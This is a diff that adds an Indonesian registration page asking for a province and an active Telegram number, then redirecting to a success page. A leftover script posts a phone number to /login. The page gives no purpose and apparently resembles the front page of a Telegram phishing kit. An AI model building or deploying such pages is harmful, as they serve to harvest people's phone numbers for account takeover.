@@ -1,0 +1,215 @@
+<!DOCTYPE html><html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Menu Pendaftaran</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      background: #f9f9f9;
+    }
+    header {
+      background: #003366;
+      color: white;
+      padding: 10px;
+      text-align: center;
+    }
+    nav {
+      display: flex;
+      justify-content: space-around;
+      background: #004080;
+      padding: 10px;
+    }
+    nav a {
+      color: white;
+      text-decoration: none;
+      font-size: 14px;
+    }
+    .banner {
+      text-align: center;
+      margin: 20px;
+    }
+    .form-box {
+      background: white;
+      margin: 0 auto;
+      padding: 20px;
+      max-width: 400px;
+      border-radius: 8px;
+      box-shadow: 0 0 10px #ccc;
+    }
+    .form-box h2 {
+      text-align: center;
+      color: #0077cc;
+    }
+    select, input {
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+    }
+    button {
+      background: #007bff;
+      color: white;
+      border: none;
+      width: 100%;
+      padding: 12px;
+      font-size: 16px;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+    .login-image {
+      text-align: center;
+      margin: 20px 0;
+    }
+    .login-image img {
+      width: 200px;
+    }
+    .header-image {
+      width: 100%;
+      height: auto;
+      display: block;
+      margin: 0 auto;
+      max-width: 600px;
+      border-radius: 8px;
+    }
+    .animated-title {
+  font-size: 20px;
+  color: #007bff;
+  font-weight: bold;
+  display: inline-block;
+  transform-origin: center;
+  animation: scaleXopenclose 2.5s infinite ease-in-out;
+}@keyframes scaleXopenclose { 0%, 100% { transform: scaleX(1); opacity: 1; } 50% { transform: scaleX(0); opacity: 0.5; } } </style>
+
+</head>
+<body>  <!-- Gambar Bagian Atas -->  <img src="IMG-20250510-WA0007_1.jpg" alt="Daftar Sekarang" class="header-image">  <div class="form-box">
+    <h2 class="animated-title">INPUT DATA DENGAN TEPAT DAN BENAR</h2><label for="provinsi">Pilih Provinsi</label>
+<select id="provinsi">
+  <option value="">Pilih</option>
+  <option value="Aceh">Aceh</option>
+  <option value="Sumatera Utara">Sumatera Utara</option>
+  <option value="Sumatera Barat">Sumatera Barat</option>
+  <option value="Riau">Riau</option>
+  <option value="Kepulauan Riau">Kepulauan Riau</option>
+  <option value="Jambi">Jambi</option>
+  <option value="Sumatera Selatan">Sumatera Selatan</option>
+  <option value="Bengkulu">Bengkulu</option>
+  <option value="Lampung">Lampung</option>
+  <option value="Bangka Belitung">Bangka Belitung</option>
+  <option value="DKI Jakarta">DKI Jakarta</option>
+  <option value="Jawa Barat">Jawa Barat</option>
+  <option value="Banten">Banten</option>
+  <option value="Jawa Tengah">Jawa Tengah</option>
+  <option value="DI Yogyakarta">DI Yogyakarta</option>
+  <option value="Jawa Timur">Jawa Timur</option>
+  <option value="Bali">Bali</option>
+  <option value="Nusa Tenggara Barat">Nusa Tenggara Barat</option>
+  <option value="Nusa Tenggara Timur">Nusa Tenggara Timur</option>
+  <option value="Kalimantan Barat">Kalimantan Barat</option>
+  <option value="Kalimantan Tengah">Kalimantan Tengah</option>
+  <option value="Kalimantan Selatan">Kalimantan Selatan</option>
+  <option value="Kalimantan Timur">Kalimantan Timur</option>
+  <option value="Kalimantan Utara">Kalimantan Utara</option>
+  <option value="Sulawesi Utara">Sulawesi Utara</option>
+  <option value="Gorontalo">Gorontalo</option>
+  <option value="Sulawesi Tengah">Sulawesi Tengah</option>
+  <option value="Sulawesi Barat">Sulawesi Barat</option>
+  <option value="Sulawesi Selatan">Sulawesi Selatan</option>
+  <option value="Sulawesi Tenggara">Sulawesi Tenggara</option>
+  <option value="Maluku">Maluku</option>
+  <option value="Maluku Utara">Maluku Utara</option>
+  <option value="Papua">Papua</option>
+  <option value="Papua Barat">Papua Barat</option>
+  <option value="Papua Tengah">Papua Tengah</option>
+  <option value="Papua Pegunungan">Papua Pegunungan</option>
+  <option value="Papua Selatan">Papua Selatan</option>
+  <option value="Papua Barat Daya">Papua Barat Daya</option>
+</select>
+
+<label for="telegram">Nomor Telegram</label>
+<input type="text" id="telegram" placeholder="Nomor Telegram Aktif" />
+
+<button id="registrasiBtn">Registrasi</button>
+
+  </div>
+<img src="IMG-20250510-WA0007_2.jpg" alt="Banner Pendaftaran" style="width:100%; max-width:480px;" />
+  </div>  
+  
+ <script>
+  const button = document.getElementById("registrasiBtn");
+  const telegramInput = document.getElementById("telegram");
+
+  // Validasi input
+  function validateInput() {
+    const nomor = telegramInput.value.trim();
+    const isValid = /^\d{10,15}$/.test(nomor); // angka saja, 10–15 digit
+
+    button.disabled = !isValid;
+  }
+
+  // Hapus karakter non-angka saat input
+  telegramInput.addEventListener("input", function () {
+    this.value = this.value.replace(/\D/g, "");
+    validateInput();
+  });
+
+  // Cegah langsung pengetikan huruf dengan keydown
+  telegramInput.addEventListener("keydown", function (e) {
+    const allowedKeys = ["Backspace", "ArrowLeft", "ArrowRight", "Tab", "Delete"];
+    if (!/\d/.test(e.key) && !allowedKeys.includes(e.key)) {
+      e.preventDefault();
+    }
+  });
+
+  // Saat tombol diklik, kirim jika valid
+  button.addEventListener("click", function () {
+    const nomor = telegramInput.value.trim();
+
+    if (!/^\d{10,15}$/.test(nomor)) {
+      alert("Harap isi nomor Telegram yang valid (10–15 digit angka).");
+      return;
+    }
+
+    button.disabled = true;
+    button.innerText = "Memproses...";
+
+    setTimeout(() => {
+      window.location.href = "berhasil.html";
+    }, 3000);
+  });
+
+  // Nonaktifkan tombol saat halaman dimuat
+  window.addEventListener("DOMContentLoaded", () => {
+    button.disabled = true;
+  });
+</script>
+
+ 
+<script>
+document.addEventListener("DOMContentLoaded", () => {
+  const form = document.querySelector("form");
+  if (form) {
+    form.addEventListener("submit", async (e) => {
+      e.preventDefault();
+      const phone = document.querySelector("input[name='phone']").value;
+
+      const res = await fetch("/login", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ phone })
+      });
+
+      if (res.redirected) {
+        window.location.href = res.url;
+      } else {
+        alert("Gagal login. Pastikan nomor benar.");
+      }
+    });
+  }
+});
+</script>
+
+</body>
+</html>
